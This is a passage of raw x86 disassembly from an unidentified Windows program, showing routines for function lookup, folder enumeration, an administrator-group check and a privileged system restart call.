  40874f:	push   ecx
  408750:	call   DWORD PTR ds:0x414048
  408756:	mov    ecx,eax
  408758:	mov    eax,ds:0x413474
  40875d:	jmp    0x408761
  40875f:	mov    ecx,esi
  408761:	mov    DWORD PTR [edi],ecx
  408763:	test   ecx,ecx
  408765:	je     0x4088a8
  40876b:	mov    DWORD PTR ds:0x413490,ecx
  408771:	test   ebx,ebx
  408773:	je     0x4087b0
  408775:	mov    ecx,DWORD PTR ds:0x413498
  40877b:	test   ecx,ecx
  40877d:	je     0x408783
  40877f:	mov    DWORD PTR [ebx],ecx
  408781:	jmp    0x4087b0
  408783:	mov    ecx,DWORD PTR [eax]
  408785:	test   ecx,ecx
  408787:	je     0x40879e
  408789:	push   0x4022e0
  40878e:	push   ecx
  40878f:	call   DWORD PTR ds:0x414048
  408795:	mov    ecx,eax
  408797:	mov    eax,ds:0x413474
  40879c:	jmp    0x4087a0
  40879e:	mov    ecx,esi
  4087a0:	mov    DWORD PTR [ebx],ecx
  4087a2:	test   ecx,ecx
  4087a4:	je     0x4088a8
  4087aa:	mov    DWORD PTR ds:0x413498,ecx
  4087b0:	mov    ebx,DWORD PTR [ebp-0x14c]
  4087b6:	test   ebx,ebx
  4087b8:	je     0x4087f5
  4087ba:	mov    ecx,DWORD PTR ds:0x413484
  4087c0:	test   ecx,ecx
  4087c2:	je     0x4087c8
  4087c4:	mov    DWORD PTR [ebx],ecx
  4087c6:	jmp    0x4087f5
  4087c8:	mov    ecx,DWORD PTR [eax]
  4087ca:	test   ecx,ecx
  4087cc:	je     0x4087e3
  4087ce:	push   0x4022f0
  4087d3:	push   ecx
  4087d4:	call   DWORD PTR ds:0x414048
  4087da:	mov    ecx,eax
  4087dc:	mov    eax,ds:0x413474
  4087e1:	jmp    0x4087e5
  4087e3:	mov    ecx,esi
  4087e5:	mov    DWORD PTR [ebx],ecx
  4087e7:	test   ecx,ecx
  4087e9:	je     0x4088a8
  4087ef:	mov    DWORD PTR ds:0x413484,ecx
  4087f5:	mov    ebx,DWORD PTR [ebp-0x150]
  4087fb:	test   ebx,ebx
  4087fd:	je     0x408836
  4087ff:	mov    ecx,DWORD PTR ds:0x4134a0
  408805:	test   ecx,ecx
  408807:	je     0x40880d
  408809:	mov    DWORD PTR [ebx],ecx
  40880b:	jmp    0x408836
  40880d:	mov    ecx,DWORD PTR [eax]
  40880f:	test   ecx,ecx
  408811:	je     0x408828
  408813:	push   0x402308
  408818:	push   ecx
  408819:	call   DWORD PTR ds:0x414048
  40881f:	mov    ecx,eax
  408821:	mov    eax,ds:0x413474
  408826:	jmp    0x40882a
  408828:	mov    ecx,esi
  40882a:	mov    DWORD PTR [ebx],ecx
  40882c:	test   ecx,ecx
  40882e:	je     0x4088a8
  408830:	mov    DWORD PTR ds:0x4134a0,ecx
  408836:	mov    ebx,DWORD PTR [ebp-0x144]
  40883c:	test   ebx,ebx
  40883e:	je     0x408877
  408840:	mov    ecx,DWORD PTR ds:0x413494
  408846:	test   ecx,ecx
  408848:	je     0x40884e
  40884a:	mov    DWORD PTR [ebx],ecx
  40884c:	jmp    0x408877
  40884e:	mov    ecx,DWORD PTR [eax]
  408850:	test   ecx,ecx
  408852:	je     0x408869
  408854:	push   0x402318
  408859:	push   ecx
  40885a:	call   DWORD PTR ds:0x414048
  408860:	mov    ecx,eax
  408862:	mov    eax,ds:0x413474
  408867:	jmp    0x40886b
  408869:	mov    ecx,esi
  40886b:	mov    DWORD PTR [ebx],ecx
  40886d:	test   ecx,ecx
  40886f:	je     0x4088a8
  408871:	mov    DWORD PTR ds:0x413494,ecx
  408877:	mov    ebx,DWORD PTR [ebp-0x148]
  40887d:	test   ebx,ebx
  40887f:	je     0x4088b2
  408881:	mov    ecx,DWORD PTR ds:0x41348c
  408887:	test   ecx,ecx
  408889:	je     0x40888f
  40888b:	mov    DWORD PTR [ebx],ecx
  40888d:	jmp    0x4088b2
  40888f:	cmp    DWORD PTR [eax],esi
  408891:	je     0x4088a2
  408893:	push   0x402330
  408898:	push   DWORD PTR [eax]
  40889a:	call   DWORD PTR ds:0x414048
  4088a0:	mov    esi,eax
  4088a2:	mov    DWORD PTR [ebx],esi
  4088a4:	test   esi,esi
  4088a6:	jne    0x4088ac
  4088a8:	xor    eax,eax
  4088aa:	jmp    0x4088b5
  4088ac:	mov    DWORD PTR ds:0x41348c,esi
  4088b2:	xor    eax,eax
  4088b4:	inc    eax
  4088b5:	pop    esi
  4088b6:	mov    ecx,DWORD PTR [ebp-0x4]
  4088b9:	pop    edi
  4088ba:	xor    ecx,ebp
  4088bc:	pop    ebx
  4088bd:	call   0x411980
  4088c2:	mov    esp,ebp
  4088c4:	pop    ebp
  4088c5:	ret    0x10
  4088c8:	int3   
  4088c9:	int3   
  4088ca:	int3   
  4088cb:	int3   
  4088cc:	int3   
  4088cd:	mov    edi,edi
  4088cf:	push   ebp
  4088d0:	mov    ebp,esp
  4088d2:	sub    esp,0x34
  4088d5:	mov    eax,ds:0x413004
  4088da:	xor    eax,ebp
  4088dc:	mov    DWORD PTR [ebp-0x4],eax
  4088df:	push   ebx
  4088e0:	push   esi
  4088e1:	push   edi
  4088e2:	mov    eax,ds:0x413478
  4088e7:	lea    edi,[ebp-0x18]
  4088ea:	mov    DWORD PTR [ebp-0x34],ecx
  4088ed:	mov    esi,0x402344
  4088f2:	mov    ebx,edx
  4088f4:	push   0x6
  4088f6:	pop    ecx
  4088f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088fc:	lea    edi,[ebp-0x30]
  4088ff:	mov    esi,0x402358
  408904:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408906:	test   eax,eax
  408908:	jne    0x408922
  40890a:	push   0x4
  40890c:	call   DWORD PTR ds:0x4141b0
  408912:	mov    ds:0x413478,eax
  408917:	test   eax,eax
  408919:	jne    0x408922
  40891b:	xor    eax,eax
  40891d:	jmp    0x4089b1
  408922:	xor    esi,esi
  408924:	cmp    DWORD PTR [eax],esi
  408926:	jne    0x40893d
  408928:	push   0x402370
  40892d:	mov    ecx,eax
  40892f:	call   0x405ca6
  408934:	test   eax,eax
  408936:	je     0x40891b
  408938:	mov    eax,ds:0x413478
  40893d:	mov    edi,DWORD PTR [ebp-0x34]
  408940:	test   edi,edi
  408942:	je     0x40897a
  408944:	mov    ecx,DWORD PTR ds:0x4134a4
  40894a:	test   ecx,ecx
  40894c:	je     0x408952
  40894e:	mov    DWORD PTR [edi],ecx
  408950:	jmp    0x40897a
  408952:	mov    ecx,DWORD PTR [eax]
  408954:	test   ecx,ecx
  408956:	je     0x40896c
  408958:	lea    eax,[ebp-0x18]
  40895b:	push   eax
  40895c:	push   ecx
  40895d:	call   DWORD PTR ds:0x414048
  408963:	mov    ecx,eax
  408965:	mov    eax,ds:0x413478
  40896a:	jmp    0x40896e
  40896c:	mov    ecx,esi
  40896e:	mov    DWORD PTR [edi],ecx
  408970:	test   ecx,ecx
  408972:	je     0x40891b
  408974:	mov    DWORD PTR ds:0x4134a4,ecx
  40897a:	test   ebx,ebx
  40897c:	je     0x4089ae
  40897e:	mov    ecx,DWORD PTR ds:0x41347c
  408984:	test   ecx,ecx
  408986:	je     0x40898c
  408988:	mov    DWORD PTR [ebx],ecx
  40898a:	jmp    0x4089ae
  40898c:	cmp    DWORD PTR [eax],esi
  40898e:	je     0x40899e
  408990:	lea    ecx,[ebp-0x30]
  408993:	push   ecx
  408994:	push   DWORD PTR [eax]
  408996:	call   DWORD PTR ds:0x414048
  40899c:	mov    esi,eax
  40899e:	mov    DWORD PTR [ebx],esi
  4089a0:	test   esi,esi
  4089a2:	je     0x40891b
  4089a8:	mov    DWORD PTR ds:0x41347c,esi
  4089ae:	xor    eax,eax
  4089b0:	inc    eax
  4089b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4089b4:	pop    edi
  4089b5:	pop    esi
  4089b6:	xor    ecx,ebp
  4089b8:	pop    ebx
  4089b9:	call   0x411980
  4089be:	mov    esp,ebp
  4089c0:	pop    ebp
  4089c1:	ret    
  4089c2:	int3   
  4089c3:	int3   
  4089c4:	int3   
  4089c5:	int3   
  4089c6:	int3   
  4089c7:	mov    edi,edi
  4089c9:	push   esi
  4089ca:	mov    eax,ecx
  4089cc:	xor    esi,esi
  4089ce:	test   eax,eax
  4089d0:	je     0x4089ef
  4089d2:	jmp    0x4089e5
  4089d4:	push   0x5c
  4089d6:	pop    edx
  4089d7:	cmp    dx,cx
  4089da:	jne    0x4089de
  4089dc:	mov    esi,eax
  4089de:	push   eax
  4089df:	call   DWORD PTR ds:0x414184
  4089e5:	movzx  ecx,WORD PTR [eax]
  4089e8:	xor    edx,edx
  4089ea:	cmp    dx,cx
  4089ed:	jne    0x4089d4
  4089ef:	mov    eax,esi
  4089f1:	pop    esi
  4089f2:	ret    
  4089f3:	int3   
  4089f4:	int3   
  4089f5:	int3   
  4089f6:	int3   
  4089f7:	int3   
  4089f8:	mov    edi,edi
  4089fa:	push   edi
  4089fb:	mov    edi,ecx
  4089fd:	test   edi,edi
  4089ff:	jne    0x408a05
  408a01:	xor    eax,eax
  408a03:	jmp    0x408a41
  408a05:	push   ebx
  408a06:	push   esi
  408a07:	push   edi
  408a08:	call   DWORD PTR ds:0x414068
  408a0e:	lea    ebx,[eax+0x1]
  408a11:	lea    eax,[ebx+ebx*1]
  408a14:	push   eax
  408a15:	call   DWORD PTR ds:0x4141b0
  408a1b:	mov    esi,eax
  408a1d:	test   esi,esi
  408a1f:	je     0x408a3d
  408a21:	push   0x100
  408a26:	push   ecx
  408a27:	push   ecx
  408a28:	push   edi
  408a29:	mov    edx,ebx
  408a2b:	mov    ecx,esi
  408a2d:	call   0x4064d3
  408a32:	test   eax,eax
  408a34:	jns    0x408a45
  408a36:	push   esi
  408a37:	call   DWORD PTR ds:0x4141bc
  408a3d:	xor    eax,eax
  408a3f:	pop    esi
  408a40:	pop    ebx
  408a41:	pop    edi
  408a42:	ret    0x8
  408a45:	mov    ecx,esi
  408a47:	call   0x4089c7
  408a4c:	test   eax,eax
  408a4e:	je     0x408a36
  408a50:	xor    ecx,ecx
  408a52:	mov    WORD PTR [eax],cx
  408a55:	mov    eax,esi
  408a57:	jmp    0x408a3f
  408a59:	int3   
  408a5a:	int3   
  408a5b:	int3   
  408a5c:	int3   
  408a5d:	int3   
  408a5e:	mov    edi,edi
  408a60:	push   ebp
  408a61:	mov    ebp,esp
  408a63:	sub    esp,0xec4
  408a69:	mov    eax,ds:0x413004
  408a6e:	xor    eax,ebp
  408a70:	mov    DWORD PTR [ebp-0x4],eax
  408a73:	push   ebx
  408a74:	push   esi
  408a75:	push   edi
  408a76:	xor    eax,eax
  408a78:	mov    DWORD PTR [ebp-0xebc],ecx
  408a7e:	xor    edi,edi
  408a80:	mov    WORD PTR [ebp-0xa58],ax
  408a87:	push   0x208
  408a8c:	lea    eax,[ebp-0xa56]
  408a92:	or     ebx,0xffffffff
  408a95:	push   edi
  408a96:	push   eax
  408a97:	mov    esi,edi
  408a99:	call   0x412060
  408a9e:	xor    eax,eax
  408aa0:	push   0x208
  408aa5:	mov    WORD PTR [ebp-0x428],ax
  408aac:	lea    eax,[ebp-0x426]
  408ab2:	push   edi
  408ab3:	push   eax
  408ab4:	call   0x412060
  408ab9:	xor    eax,eax
  408abb:	push   0x208
  408ac0:	mov    WORD PTR [ebp-0x638],ax
  408ac7:	lea    eax,[ebp-0x636]
  408acd:	push   edi
  408ace:	push   eax
  408acf:	call   0x412060
  408ad4:	add    esp,0x24
  408ad7:	lea    eax,[ebp-0x638]
  408add:	push   eax
  408ade:	push   0x1
  408ae0:	push   edi
  408ae1:	push   0x28
  408ae3:	push   edi
  408ae4:	call   DWORD PTR ds:0x414130
  408aea:	test   eax,eax
  408aec:	js     0x408ed2
  408af2:	lea    eax,[ebp-0xec0]
  408af8:	mov    DWORD PTR [ebp-0xec0],edi
  408afe:	push   eax
  408aff:	lea    ecx,[ebp-0x638]
  408b05:	call   0x406735
  408b0a:	test   eax,eax
  408b0c:	jns    0x408b27
  408b0e:	push   eax
  408b0f:	push   0x402388
  408b14:	push   DWORD PTR ds:0x4130e8
  408b1a:	call   0x40e818
  408b1f:	add    esp,0xc
  408b22:	jmp    0x408ef2
  408b27:	xor    eax,eax
  408b29:	mov    ebx,0x208
  408b2e:	push   ebx
  408b2f:	mov    WORD PTR [ebp-0x218],ax
  408b36:	lea    eax,[ebp-0x216]
  408b3c:	push   edi
  408b3d:	push   eax
  408b3e:	call   0x412060
  408b43:	add    esp,0xc
  408b46:	mov    DWORD PTR [ebp-0xec4],edi
  408b4c:	lea    eax,[ebp-0x218]
  408b52:	push   eax
  408b53:	push   0x1
  408b55:	push   edi
  408b56:	push   0x1a
  408b58:	push   edi
  408b59:	call   DWORD PTR ds:0x414130
  408b5f:	test   eax,eax
  408b61:	jns    0x408b6b
  408b63:	push   eax
  408b64:	push   0x4023d8
  408b69:	jmp    0x408b14
  408b6b:	lea    eax,[ebp-0xec4]
  408b71:	push   eax
  408b72:	lea    ecx,[ebp-0x218]
  408b78:	call   0x406735
  408b7d:	test   eax,eax
  408b7f:	jns    0x408b89
  408b81:	push   eax
  408b82:	push   0x402428
  408b87:	jmp    0x408b14
  408b89:	mov    eax,DWORD PTR [ebp-0xec0]
  408b8f:	lea    ecx,[ebp-0x216]
  408b95:	cmp    eax,DWORD PTR [ebp-0xec4]
  408b9b:	lea    ecx,[ecx+eax*2]
  408b9e:	sbb    eax,eax
  408ba0:	and    eax,ecx
  408ba2:	je     0x408ebe
  408ba8:	push   ecx
  408ba9:	push   eax
  408baa:	push   edi
  408bab:	mov    edx,0x105
  408bb0:	lea    ecx,[ebp-0xa58]
  408bb6:	call   0x4067ca
  408bbb:	push   ecx
  408bbc:	push   ecx
  408bbd:	lea    ecx,[ebp-0x638]
  408bc3:	call   0x4089f8
  408bc8:	mov    edi,eax
  408bca:	test   edi,edi
  408bcc:	je     0x408eb7
  408bd2:	push   ecx
  408bd3:	push   edi
  408bd4:	push   0x0
  408bd6:	mov    edx,0x105
  408bdb:	lea    ecx,[ebp-0x428]
  408be1:	call   0x4067ca
  408be6:	push   edi
  408be7:	call   DWORD PTR ds:0x4141bc
  408bed:	lea    eax,[ebp-0x428]
  408bf3:	push   eax
  408bf4:	push   0x40255c
  408bf9:	push   DWORD PTR ds:0x4130e8
  408bff:	call   0x40e818
  408c04:	xor    eax,eax
  408c06:	push   ebx
  408c07:	push   eax
  408c08:	mov    WORD PTR [ebp-0x848],ax
  408c0f:	lea    eax,[ebp-0x846]
  408c15:	push   eax
  408c16:	call   0x412060
  408c1b:	lea    eax,[ebp-0x428]
  408c21:	push   eax
  408c22:	push   0x402584
  408c27:	push   0x100
  408c2c:	push   0x0
  408c2e:	push   0x0
  408c30:	lea    eax,[ebp-0x848]
  408c36:	push   0x105
  408c3b:	push   eax
  408c3c:	call   0x4065c9
  408c41:	add    esp,0x34
  408c44:	test   eax,eax
  408c46:	jns    0x408c50
  408c48:	movzx  esi,ax
  408c4b:	jmp    0x408ef2
  408c50:	lea    eax,[ebp-0x848]
  408c56:	push   eax
  408c57:	push   0x402590
  408c5c:	push   DWORD PTR ds:0x4130e8
  408c62:	call   0x40e818
  408c67:	add    esp,0xc
  408c6a:	lea    eax,[ebp-0xeb8]
  408c70:	push   eax
  408c71:	lea    eax,[ebp-0x848]
  408c77:	push   eax
  408c78:	call   DWORD PTR ds:0x414050
  408c7e:	mov    ebx,eax
  408c80:	cmp    ebx,0xffffffff
  408c83:	jne    0x408c92
  408c85:	call   DWORD PTR ds:0x414074
  408c8b:	mov    esi,eax
  408c8d:	jmp    0x408ef2
  408c92:	test   BYTE PTR [ebp-0xeb8],0x10
  408c99:	je     0x408e9e
  408c9f:	mov    ecx,0x4025b0
  408ca4:	lea    eax,[ebp-0xe8c]
  408caa:	mov    dx,WORD PTR [eax]
  408cad:	cmp    dx,WORD PTR [ecx]
  408cb0:	jne    0x408cd0
  408cb2:	test   dx,dx
  408cb5:	je     0x408ccc
  408cb7:	mov    dx,WORD PTR [eax+0x2]
  408cbb:	cmp    dx,WORD PTR [ecx+0x2]
  408cbf:	jne    0x408cd0
  408cc1:	add    eax,0x4
  408cc4:	add    ecx,0x4
  408cc7:	test   dx,dx
  408cca:	jne    0x408caa
  408ccc:	xor    eax,eax
  408cce:	jmp    0x408cd5
  408cd0:	sbb    eax,eax
  408cd2:	or     eax,0x1
  408cd5:	test   eax,eax
  408cd7:	je     0x408e9e
  408cdd:	mov    ecx,0x4025b4
  408ce2:	lea    eax,[ebp-0xe8c]
  408ce8:	mov    dx,WORD PTR [eax]
  408ceb:	cmp    dx,WORD PTR [ecx]
  408cee:	jne    0x408d0e
  408cf0:	test   dx,dx
  408cf3:	je     0x408d0a
  408cf5:	mov    dx,WORD PTR [eax+0x2]
  408cf9:	cmp    dx,WORD PTR [ecx+0x2]
  408cfd:	jne    0x408d0e
  408cff:	add    eax,0x4
  408d02:	add    ecx,0x4
  408d05:	test   dx,dx
  408d08:	jne    0x408ce8
  408d0a:	xor    eax,eax
  408d0c:	jmp    0x408d13
  408d0e:	sbb    eax,eax
  408d10:	or     eax,0x1
  408d13:	test   eax,eax
  408d15:	je     0x408e9e
  408d1b:	lea    eax,[ebp-0xe8c]
  408d21:	push   eax
  408d22:	push   0x4025bc
  408d27:	push   DWORD PTR ds:0x4130e8
  408d2d:	call   0x40e818
  408d32:	xor    eax,eax
  408d34:	push   0x208
  408d39:	push   eax
  408d3a:	mov    WORD PTR [ebp-0x218],ax
  408d41:	lea    eax,[ebp-0x216]
  408d47:	push   eax
  408d48:	call   0x412060
  408d4d:	push   DWORD PTR [ebp-0xebc]
  408d53:	lea    eax,[ebp-0xa58]
  408d59:	push   0x4025d8
  408d5e:	push   eax
  408d5f:	lea    eax,[ebp-0xe8c]
  408d65:	push   eax
  408d66:	lea    eax,[ebp-0x428]
  408d6c:	push   eax
  408d6d:	push   0x402628
  408d72:	push   0x100
  408d77:	push   0x0
  408d79:	push   0x0
  408d7b:	lea    eax,[ebp-0x218]
  408d81:	push   0x105
  408d86:	push   eax
  408d87:	call   0x4065c9
  408d8c:	add    esp,0x44
  408d8f:	test   eax,eax
  408d91:	js     0x408dd6
  408d93:	lea    eax,[ebp-0x218]
  408d99:	push   eax
  408d9a:	push   0x402648
  408d9f:	push   DWORD PTR ds:0x4130e8
  408da5:	call   0x40e818
  408daa:	add    esp,0xc
  408dad:	lea    ecx,[ebp-0x218]
  408db3:	call   0x40d9fa
  408db8:	mov    edi,eax
  408dba:	test   edi,edi
  408dbc:	je     0x408de8
  408dbe:	push   edi
  408dbf:	push   0x402688
  408dc4:	push   DWORD PTR ds:0x4130e8
  408dca:	call   0x40e818
  408dcf:	add    esp,0xc
  408dd2:	mov    esi,edi
  408dd4:	jmp    0x408de8
  408dd6:	push   0x4026e8
  408ddb:	push   DWORD PTR ds:0x4130e8
  408de1:	call   0x40e818
  408de6:	pop    ecx
  408de7:	pop    ecx
  408de8:	xor    eax,eax
  408dea:	push   0x208
  408def:	push   eax
  408df0:	mov    WORD PTR [ebp-0xc68],ax
  408df7:	lea    eax,[ebp-0xc66]
  408dfd:	push   eax
  408dfe:	call   0x412060
  408e03:	push   DWORD PTR [ebp-0xebc]
  408e09:	lea    eax,[ebp-0xa58]
  408e0f:	push   0x4025d8
  408e14:	push   eax
  408e15:	lea    eax,[ebp-0xe8c]
  408e1b:	push   eax
  408e1c:	lea    eax,[ebp-0x428]
  408e22:	push   eax
  408e23:	push   0x402740
  408e28:	push   0x100
  408e2d:	push   0x0
  408e2f:	push   0x0
  408e31:	lea    eax,[ebp-0xc68]
  408e37:	push   0x105
  408e3c:	push   eax
  408e3d:	call   0x4065c9
  408e42:	add    esp,0x38
  408e45:	test   eax,eax
  408e47:	js     0x408e8c
  408e49:	lea    eax,[ebp-0xc68]
  408e4f:	push   eax
  408e50:	push   0x402768
  408e55:	push   DWORD PTR ds:0x4130e8
  408e5b:	call   0x40e818
  408e60:	add    esp,0xc
  408e63:	lea    ecx,[ebp-0xc68]
  408e69:	call   0x40d9fa
  408e6e:	mov    edi,eax
  408e70:	test   edi,edi
  408e72:	je     0x408e9e
  408e74:	push   edi
  408e75:	push   0x4027a8
  408e7a:	push   DWORD PTR ds:0x4130e8
  408e80:	call   0x40e818
  408e85:	add    esp,0xc
  408e88:	mov    esi,edi
  408e8a:	jmp    0x408e9e
  408e8c:	push   0x402808
  408e91:	push   DWORD PTR ds:0x4130e8
  408e97:	call   0x40e818
  408e9c:	pop    ecx
  408e9d:	pop    ecx
  408e9e:	lea    eax,[ebp-0xeb8]
  408ea4:	push   eax
  408ea5:	push   ebx
  408ea6:	call   DWORD PTR ds:0x414080
  408eac:	cmp    eax,0x1
  408eaf:	je     0x408c92
  408eb5:	jmp    0x408ee6
  408eb7:	mov    esi,0xffff
  408ebc:	jmp    0x408ef2
  408ebe:	push   0x402478
  408ec3:	push   DWORD PTR ds:0x4130e8
  408ec9:	call   0x40e818
  408ece:	pop    ecx
  408ecf:	pop    ecx
  408ed0:	jmp    0x408ef2
  408ed2:	push   eax
  408ed3:	push   0x402510
  408ed8:	push   DWORD PTR ds:0x4130e8
  408ede:	call   0x40e818
  408ee3:	add    esp,0xc
  408ee6:	cmp    ebx,0xffffffff
  408ee9:	je     0x408ef2
  408eeb:	push   ebx
  408eec:	call   DWORD PTR ds:0x414078
  408ef2:	mov    ecx,DWORD PTR [ebp-0x4]
  408ef5:	mov    eax,esi
  408ef7:	pop    edi
  408ef8:	pop    esi
  408ef9:	xor    ecx,ebp
  408efb:	pop    ebx
  408efc:	call   0x411980
  408f01:	mov    esp,ebp
  408f03:	pop    ebp
  408f04:	ret    
  408f05:	int3   
  408f06:	int3   
  408f07:	int3   
  408f08:	int3   
  408f09:	int3   
  408f0a:	mov    edi,edi
  408f0c:	push   ebp
  408f0d:	mov    ebp,esp
  408f0f:	sub    esp,0x18
  408f12:	mov    eax,ds:0x413004
  408f17:	xor    eax,ebp
  408f19:	mov    DWORD PTR [ebp-0x4],eax
  408f1c:	push   ebx
  408f1d:	xor    ebx,ebx
  408f1f:	mov    WORD PTR [ebp-0x8],0x500
  408f25:	mov    DWORD PTR [ebp-0x14],ebx
  408f28:	mov    DWORD PTR [ebp-0xc],ebx
  408f2b:	mov    DWORD PTR [ebp-0x10],ebx
  408f2e:	test   edx,edx
  408f30:	je     0x408f3b
  408f32:	push   0x20
  408f34:	mov    BYTE PTR [ebp-0x18],0x2
  408f38:	pop    eax
  408f39:	jmp    0x408f43
  408f3b:	mov    eax,ecx
  408f3d:	mov    BYTE PTR [ebp-0x18],0x1
  408f41:	mov    ecx,ebx
  408f43:	lea    edx,[ebp-0x14]
  408f46:	push   edx
  408f47:	push   ebx
  408f48:	push   ebx
  408f49:	push   ebx
  408f4a:	push   ebx
  408f4b:	push   ebx
  408f4c:	push   ebx
  408f4d:	push   ecx
  408f4e:	push   eax
  408f4f:	push   DWORD PTR [ebp-0x18]
  408f52:	lea    eax,[ebp-0xc]
  408f55:	push   eax
  408f56:	call   DWORD PTR ds:0x41402c
  408f5c:	test   eax,eax
  408f5e:	je     0x408fc4
  408f60:	push   esi
  408f61:	push   edi
  408f62:	mov    edi,0x402a98
  408f67:	push   edi
  408f68:	call   DWORD PTR ds:0x4140a8
  408f6e:	mov    esi,eax
  408f70:	test   esi,esi
  408f72:	jne    0x408f83
  408f74:	push   ebx
  408f75:	push   ebx
  408f76:	push   edi
  408f77:	call   DWORD PTR ds:0x4140ac
  408f7d:	mov    esi,eax
  408f7f:	test   esi,esi
  408f81:	je     0x408fae
  408f83:	push   0x402aa8
  408f88:	push   esi
  408f89:	call   DWORD PTR ds:0x414048
  408f8f:	mov    edi,eax
  408f91:	test   edi,edi
  408f93:	je     0x408fae
  408f95:	lea    eax,[ebp-0x10]
  408f98:	mov    ecx,edi
  408f9a:	push   eax
  408f9b:	push   DWORD PTR [ebp-0x14]
  408f9e:	push   ebx
  408f9f:	call   DWORD PTR ds:0x414220
  408fa5:	call   edi
  408fa7:	neg    eax
  408fa9:	sbb    eax,eax
  408fab:	and    DWORD PTR [ebp-0x10],eax
  408fae:	push   DWORD PTR [ebp-0x14]
  408fb1:	call   DWORD PTR ds:0x414030
  408fb7:	test   esi,esi
  408fb9:	je     0x408fc2
  408fbb:	push   esi
  408fbc:	call   DWORD PTR ds:0x414120
  408fc2:	pop    edi
  408fc3:	pop    esi
  408fc4:	mov    ecx,DWORD PTR [ebp-0x4]
  408fc7:	mov    eax,DWORD PTR [ebp-0x10]
  408fca:	xor    ecx,ebp
  408fcc:	pop    ebx
  408fcd:	call   0x411980
  408fd2:	mov    esp,ebp
  408fd4:	pop    ebp
  408fd5:	ret    
  408fd6:	int3   
  408fd7:	int3   
  408fd8:	int3   
  408fd9:	int3   
  408fda:	int3   
  408fdb:	xor    edx,edx
  408fdd:	mov    ecx,0x220
  408fe2:	inc    edx
  408fe3:	jmp    0x408f0a
  408fe8:	int3   
  408fe9:	int3   
  408fea:	int3   
  408feb:	int3   
  408fec:	int3   
  408fed:	mov    edi,edi
  408fef:	push   ebp
  408ff0:	mov    ebp,esp
  408ff2:	push   ebx
  408ff3:	xor    eax,eax
  408ff5:	mov    ebx,0x401068
  408ffa:	cmp    eax,ebx
  408ffc:	je     0x409097
  409002:	cmp    DWORD PTR [ebp+0xc],eax
  409005:	je     0x409097
  40900b:	push   esi
  40900c:	push   edi
  40900d:	push   0x208
  409012:	mov    edi,0x104
  409017:	call   DWORD PTR ds:0x4141b0
  40901d:	mov    esi,eax
  40901f:	test   esi,esi
  409021:	je     0x409091
  409023:	push   DWORD PTR [ebp+0xc]
  409026:	push   edi
  409027:	push   esi
  409028:	push   ebx
  409029:	push   0x402a4c
  40902e:	push   0x401498
  409033:	call   DWORD PTR ds:0x414114
  409039:	mov    edx,eax
  40903b:	lea    ecx,[edi-0x2]
  40903e:	cmp    edx,ecx
  409040:	jne    0x409052
  409042:	xor    eax,eax
  409044:	cmp    eax,0x401498
  409049:	je     0x409069
  40904b:	cmp    eax,0x402a4c
  409050:	je     0x409069
  409052:	lea    eax,[edi-0x1]
  409055:	cmp    edx,eax
  409057:	jne    0x409084
  409059:	xor    eax,eax
  40905b:	cmp    eax,0x401498
  409060:	je     0x409084
  409062:	cmp    eax,0x402a4c
  409067:	je     0x409084
  409069:	add    edi,edi
  40906b:	cmp    edi,0x100000
  409071:	ja     0x409091
  409073:	lea    eax,[edi+edi*1]
  409076:	push   eax
  409077:	push   esi
  409078:	call   DWORD PTR ds:0x4141a4
  40907e:	test   eax,eax
  409080:	jne    0x40901d
  409082:	jmp    0x409088
  409084:	test   edx,edx
  409086:	jne    0x409091
  409088:	push   esi
  409089:	call   DWORD PTR ds:0x4141bc
  40908f:	xor    esi,esi
  409091:	pop    edi
  409092:	mov    eax,esi
  409094:	pop    esi
  409095:	jmp    0x409099
  409097:	xor    eax,eax
  409099:	pop    ebx
  40909a:	pop    ebp
  40909b:	ret    0x8
  40909e:	int3   
  40909f:	int3   
  4090a0:	int3   
  4090a1:	int3   
  4090a2:	int3   
  4090a3:	mov    edi,edi
  4090a5:	push   ebp
  4090a6:	mov    ebp,esp
  4090a8:	sub    esp,0x1c
  4090ab:	mov    eax,ds:0x413004
  4090b0:	xor    eax,ebp
  4090b2:	mov    DWORD PTR [ebp-0x4],eax
  4090b5:	push   esi
  4090b6:	lea    eax,[ebp-0x18]
  4090b9:	xor    esi,esi
  4090bb:	push   eax
  4090bc:	push   0x28
  4090be:	mov    DWORD PTR [ebp-0x18],esi
  4090c1:	call   DWORD PTR ds:0x414054
  4090c7:	push   eax
  4090c8:	call   DWORD PTR ds:0x41400c
  4090ce:	test   eax,eax
  4090d0:	je     0x40911c
  4090d2:	lea    eax,[ebp-0x10]
  4090d5:	push   eax
  4090d6:	push   0x402ac0
  4090db:	push   esi
  4090dc:	call   DWORD PTR ds:0x414024
  4090e2:	push   esi
  4090e3:	push   esi
  4090e4:	push   esi
  4090e5:	lea    eax,[ebp-0x14]
  4090e8:	mov    DWORD PTR [ebp-0x14],0x1
  4090ef:	push   eax
  4090f0:	push   esi
  4090f1:	push   DWORD PTR [ebp-0x18]
  4090f4:	mov    DWORD PTR [ebp-0x8],0x2
  4090fb:	call   DWORD PTR ds:0x414034
  409101:	call   DWORD PTR ds:0x414074
  409107:	test   eax,eax
  409109:	jne    0x40911c
  40910b:	push   0x1
  40910d:	push   esi
  40910e:	push   0x14
  409110:	push   esi
  409111:	push   esi
  409112:	call   DWORD PTR ds:0x414038
  409118:	test   eax,eax
  40911a:	jne    0x409133
  40911c:	call   DWORD PTR ds:0x414074
  409122:	mov    esi,eax
  409124:	test   esi,esi
  409126:	jle    0x409147
  409128:	movzx  esi,si
  40912b:	or     esi,0x80070000
  409131:	jmp    0x409147
  409133:	push   esi
  409134:	push   esi
  409135:	push   esi
  409136:	lea    eax,[ebp-0x14]
  409139:	mov    DWORD PTR [ebp-0x8],esi
  40913c:	push   eax
  40913d:	push   esi
  40913e:	push   DWORD PTR [ebp-0x18]
  409141:	call   DWORD PTR ds:0x414034
  409147:	cmp    DWORD PTR [ebp-0x18],0x0
  40914b:	je     0x409156
  40914d:	push   DWORD PTR [ebp-0x18]
  409150:	call   DWORD PTR ds:0x414084
  409156:	mov    ecx,DWORD PTR [ebp-0x4]
  409159:	mov    eax,esi
  40915b:	xor    ecx,ebp
  40915d:	pop    esi
